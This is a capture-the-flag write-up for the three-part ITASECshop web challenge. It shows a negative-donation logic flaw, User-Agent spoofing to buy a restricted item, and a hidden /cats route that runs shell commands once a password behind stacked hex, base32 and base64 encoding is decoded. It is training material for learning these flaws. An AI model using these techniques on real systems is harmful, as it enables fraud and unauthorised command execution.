# ITASECshop — Full CTF Writeup

**Competition:** ITASEC  
**Category:** Web  
**Parts:** 3 (ITASECshop - 1mln$ Flag · Fridge Flag · H4ck3d)

---

## Overview

The challenge was split into **three separate CTF tasks** on the scoreboard:

| Task                     |
| ------------------------ |
| ITASECshop - 1mln$ Flag  |
| ITASECshop - Fridge Flag |
| ITASECshop - H4ck3d      |

![alt text](<ss/Screenshot 2026-05-11 193108.png>)
The shop exposes two obviously-named items — _1.000.000$ FLAG_ and _-10°C FLAG_ — which yield the first two flags (Parts 1 and 2). The real challenge (Part 3, **H4ck3d**) is a hidden route that exposes command execution through `./shell`.

> ⚠️ Part 3 (**H4ck3d**) is **completely unsolvable without the application source code**, which was only handed out as part of solving Part 1.

---

## Hints given

```
- Base64 and hex only hide information in appearance...
- ./shell ti offre una shell linux completa...
```

---

## Part 1 — 1mln$ Flag (`ITASEC{it_4as_A_th3ft_not_a_D0nat10n!}`)

### Vulnerability: Negative donation

New accounts start with a wallet of **€23.00**. The million-dollar item obviously can't be bought directly.

The `/store/donate` endpoint contains this logic:

```python
if user.wallet < float(request.form["price"]):
    return render_template("donate.html", ..., error="Non hai abbastanza soldi")
user.wallet -= float(request.form["price"])
```

There is **no check that the price is positive**. Submitting `price = -1000000` causes:

```python
user.wallet -= (-1000000)  # wallet increases by 1,000,000
```

### Steps

1. Register an account (wallet starts at €23).
2. `POST /store/donate` with `price=-1000000` → wallet becomes €1,000,023.
3. Buy the _1.000.000$ FLAG_ item normally.

**Flag:** `ITASEC{it_4as_A_th3ft_not_a_D0nat10n!}`

---

## Part 2 — Fridge Flag (`ITASEC{A_fr0zen_USER-AGENT}`)

### Vulnerability: User-Agent header spoofing

The `-10°C FLAG` item (Samsung Smart Fridge) has a client-controlled access restriction:

```python
if "Samsung Smart Fridge" in article.description:
    if not "samsung smart fridge" in request.headers.get("User-Agent").lower():
        return render_template("article.html", ..., error="Solo i Samsung Smart Fridge possono acquistare questo articolo")
```

The server trusts the `User-Agent` header entirely. Simply spoof it.

### Steps

1. After inflating your wallet (same as Part 1), send the buy request with a spoofed header:
   ```http
   POST /store/<fridge_id>/buy
   User-Agent: samsung smart fridge
   ```

**Flag:** `ITASEC{A_fr0zen_USER-AGENT}`

---

## Part 3 — H4ck3d (`ITASEC{An_inn0cent_(and_Cute)_AP1}`)

> This part **requires the source code** obtained from Part 1. It was not solvable independently.

### Step 1: Discover the hidden route

The `/cats` route is **not linked anywhere in the UI**. It only appears in the source code:

```python
@app.route('/cats', methods=['GET'])
@authorize()
def cats(user: User):
```

### Step 2: Understand the three access requirements

```python
if flag1 and flag2 and request.args.get('psw') == <decoded_secret>:
    return subprocess.run(['./shell', request.args.get('cmd')], ...).stdout.decode()
```

To reach the shell, you need:

- `flag1` = own an article with `1.000.000` in its description (Part 1 item ✓)
- `flag2` = own an article with `Samsung Smart Fridge` in its description (Part 2 item ✓)
- `psw` = the correct decoded password (see below)

### Step 3: Decode the password from `cat_food`

The password is stored in `cat_food` as a hex string, encoded through **four layers of obfuscation**:

```
hex → base32 → hex → base64
```

Step by step:

```python
import base64

cat_food = "47 52 52 53 41 4e 4a 54 45 41 5a 54 41 49 42 58 47 51 51 44 4b 4e 4a 41 47 51 32 43 41 4e 4a 53 45 41 33 57 43 49 42 57 47 4d 51 44 47 4d 5a 41 47 59 5a 53 41 4e 5a 58 45 41 33 44 47 49 42 57 4d 51 51 44 4b 4d 4a 41 47 5a 52 43 41 4e 44 42 45 41 32 44 47 49 42 56 47 45 51 44 4d 59 52 41 47 52 51 53 41 4e 42 54 45 41 32 54 45 49 42 54 47 45 51 44 4d 4d 5a 41 47 51 33 53 41 4e 4a 57 45 41 33 54 53 49 42 56 47 55 51 44 47 4d 52 41 47 5a 52 53 41 4e 54 42 45 41 33 44 49 49 42 56 48 41 51 44 49 59 4a 41 47 59 34 43 41 4e 4a 52 45 41 32 44 4b 49 42 55 47 45 51 44 4d 59 4a 41 47 51 34 53 41 4e 5a 5a 45 41 32 47 49 49 42 57 48 41 51 44 4d 4d 52 41 47 55 33 53 41 4e 4a 57 45 41 33 44 51 49 42 57 47 51 51 44 4f 4f 4a 41 47 4d 59 43 41 4e 5a 55 45 41 32 47 47 49 42 56 47 45 51 44 47 5a 42 41 47 4e 53 41 3d 3d 3d 3d"

# Step 1: hex string → bytes → string (gives base32 text)
x = bytes.fromhex(cat_food.replace(" ", "")).decode()
# → "GRRSANJTEAZTAIBXGQQDKNJAGQ2C..."

# Step 2: base32 decode → string (gives another hex string)
x = base64.b32decode(x).decode()
# → "4c 53 30 74 55 44 52 7a 63 33 ..."

# Step 3: hex decode again → string (gives base64 text)
x = bytes.fromhex(x).decode()
# → "LS0tUDRzc3cwcmQkJCQkJCR1cGVy..."

# Step 4: base64 decode → final password
x = base64.b64decode(x).decode()
# → ---P4ssw0rd$$$$$$uperSicura@@###!meaw---
```

As the hint stated: _"Base64 and hex only hide information in appearance"_ — none of this is encryption, just stacked encoding.

**Decoded password:** `---P4ssw0rd$$$$$$uperSicura@@###!meaw---`

### Step 4: Remote Code Execution

With both items owned and the password known, hit `/cats` with a `cmd` parameter. The server runs:

```python
subprocess.run(['./shell', request.args.get('cmd')], stdout=subprocess.PIPE, ...)
```

As the hint stated: _"./shell ti offre una shell linux completa"_ — it's a full Linux shell.

**List files:**
![alt text](<ss/Screenshot 2026-05-11 193902.png>)
**Read the flag:**
![alt text](<ss/Screenshot 2026-05-11 193950.png>)

**Flag:** `ITASEC{An_inn0cent_(and_Cute)_AP1}`
